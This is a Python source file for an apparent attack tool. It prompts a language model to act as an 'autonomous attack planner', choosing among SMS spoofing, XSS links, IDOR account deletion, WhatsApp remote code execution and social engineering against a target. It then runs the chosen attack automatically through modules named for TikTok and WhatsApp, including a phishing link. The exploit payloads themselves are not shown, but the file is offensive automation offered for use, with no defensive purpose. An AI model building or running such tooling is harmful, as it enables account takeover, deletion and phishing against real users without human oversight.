import os
import json
import groq
import google.generativeai as genai
from config import GROQ_API_KEY, GOOGLE_API_KEY
from modules.utils import logger

class AIAnalyzer:
    def __init__(self, orchestrator):
        self.orchestrator = orchestrator
        self.groq_client = groq.Client(api_key=GROQ_API_KEY) if GROQ_API_KEY else None
        self.gemini_model = None
        if GOOGLE_API_KEY:
            genai.configure(api_key=GOOGLE_API_KEY)
            # Updated to a working model
            self.gemini_model = genai.GenerativeModel('gemini-1.5-flash')

    def _call_llm(self, prompt, max_tokens=400, temperature=0.2):
        raw = None
        if self.groq_client:
            try:
                response = self.groq_client.chat.completions.create(
                    model="llama-3.1-70b-versatile",
                    messages=[{"role": "user", "content": prompt}],
                    temperature=temperature,
                    max_tokens=max_tokens
                )
                raw = response.choices[0].message.content
                print(f"Groq response: {raw[:100]}...")
                return raw
            except Exception as e:
                print(f"Groq detailed error: {type(e).__name__}: {e}")
                logger.warning(f"Groq failed: {e}. Falling back to Gemini.")
        if self.gemini_model:
            try:
                response = self.gemini_model.generate_content(prompt)
                raw = response.text
                print(f"Gemini response: {raw[:100]}...")
                return raw
            except Exception as e:
                print(f"Gemini detailed error: {type(e).__name__}: {e}")
                logger.error(f"Gemini also failed: {e}")
                raise RuntimeError(f"Both AI providers failed. Last error: {e}")
        raise RuntimeError("No AI API key configured.")

    def analyze_and_act(self, target_id, target_data):
        raw = ""
        prompt = f"""
You are an autonomous attack planner. You MUST output a single JSON object with:
- "best_attack": one of ["sms_spoof", "xss_link", "idor_delete", "wa_rce", "social_engineering"]
- "reasoning": short explanation
- "parameters": dict (e.g., {{"phone": "+1234567890", "email": "target@example.com", "username": "victim", "account_id": "123"}})

Target data: {json.dumps(target_data)}
Output ONLY JSON. No extra text.
"""
        try:
            raw = self._call_llm(prompt, max_tokens=300, temperature=0.3)
            result = json.loads(raw)
        except Exception as e:
            print(f"AI parsing failed: {e}. Raw: {raw[:200] if raw else 'empty'}")
            logger.error(f"AI parsing failed: {e}. Using fallback.")
            return {
                "best_attack": "xss_link",
                "reasoning": f"Fallback due to AI error: {str(e)}",
                "parameters": {"username": target_data.get("identifier", ""), "email": "fallback@example.com"}
            }

        attack = result.get("best_attack")
        params = result.get("parameters", {})
        exec_result = self._execute_attack(target_id, attack, params)
        result['execution_result'] = exec_result
        self.orchestrator.log_attack(target_id, attack, exec_result)
        return result

    def _execute_attack(self, target_id, attack_type, params):
        if attack_type == 'sms_spoof':
            return self.orchestrator.tiktok_sms.exploit(params.get('phone'), 'http://phishing.link')
        elif attack_type == 'xss_link':
            return self.orchestrator.tiktok_xss.exploit(params.get('username'), params.get('email'))
        elif attack_type == 'idor_delete':
            return self.orchestrator.tiktok_idor.exploit(params.get('account_id'))
        elif attack_type == 'wa_rce':
            return self.orchestrator.wa_rce.exploit(params.get('phone'))
        elif attack_type == 'social_engineering':
            return self.orchestrator.social_engineer(params)
        else:
            return {'success': False, 'output': f'Unknown attack type: {attack_type}'}
